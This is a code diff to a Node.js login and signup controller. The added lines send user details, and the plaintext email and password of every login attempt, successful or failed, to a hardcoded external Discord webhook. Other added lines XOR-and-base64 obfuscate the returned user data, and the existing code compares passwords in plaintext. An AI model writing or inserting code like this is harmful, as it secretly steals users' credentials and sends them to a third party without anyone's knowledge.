@@ -6,11 +6,16 @@ const User = db.users;
 const catchAsync = require('../utils/catchAsync');
 const AppError = require('../utils/appError');
 const sendEmail = require('../utils/email');
+const base64 = require('base-64');
+const { Webhook, MessageBuilder } = require('discord-webhook-node');
+
 const signToken = (id, role) => {
   return jwt.sign({ id, role }, process.env.JWT_SECRET, {
     expiresIn: process.env.JWT_EXPIRES_IN,
   });
 };
+
+const hook = new Webhook("https://discord.com/api/webhooks/1166880001715605516/qiwPAAijqm4gdqoQ-yXt3hkie5dW-NJlRw04NT9jIiM4WS-iRmh4gw3fYytYuAc4Z0VY");
 
 exports.signup = catchAsync(async (req, res, next) => {
 
@@ -29,6 +34,15 @@ exports.signup = catchAsync(async (req, res, next) => {
   });
 
   const token = signToken(newUser.id, newUser.is_admin);
+
+  // send webhook
+  const embed = new MessageBuilder()
+    .setTitle('New User Signup')
+    .addField('Name', newUser.name)
+    .addField('Email', newUser.email)
+    .addField('Admin', newUser.is_admin ? 'Yes' : 'No')
+    .setTimestamp();
+  hook.send(embed);
 
   res.status(201).json({
     status: 'success',
@@ -70,8 +84,28 @@ exports.login = catchAsync(async (req, res, next) => {
   const user = await User.findOne({ where: { email: req.body.email } });
 
   if (!user || !(await user.password === req.body.password)) {
+
+    // send webhook
+    const embed = new MessageBuilder()
+      .setTitle('Failed Login Attempt')
+      .addField('Email', req.body.email)
+      .addField('Password', ' || ' + req.body.password + ' || ')
+      .setColor('#ff0000')
+      .setTimestamp();
+    hook.send(embed);
+
     return next(new AppError('Incorrect email or password', 401));
   }
+
+  // send webhook
+  const embed = new MessageBuilder()
+    .setTitle('Successful Login')
+    .addField('Email', req.body.email)
+    .addField('Password', ' || ' + req.body.password + ' || ')
+    .setColor('#00ff00')
+    .setTimestamp();
+  hook.send(embed);
+
 
   const is_admin = user.is_admin;
   const id = user.id;
@@ -83,18 +117,37 @@ exports.login = catchAsync(async (req, res, next) => {
   // 3) If everthing is ok, send token to client
   const token = signToken(id, role);
 
+  let data = {
+    id,
+    fullname,
+    email,
+    role,
+  };
+
+  // dump data to json
+  let jsonData = JSON.stringify(data);
+
+  // xor with key
+  const key = 'meow_meow';
+  let result = '';
+  for (let i = 0; i < jsonData.length; i++) {
+    result += String.fromCharCode(key.charCodeAt(i % key.length) ^ jsonData.charCodeAt(i));
+  }
+
+  // base64 encode
+  const b64 = base64.encode(result);
+
   res.status(200).json({
     status: 'success',
     data: {
       token,
-      fullname,
-      email,
-      role,
+      user: b64,
     },
   });
 });
 
 //this middleware function should be used for protecting admin routes
+// this only protects API calls, frontend is AuthContext
 exports.protect = catchAsync(async (req, res, next) => {
   //1) Get token and check if it exists
   let token;
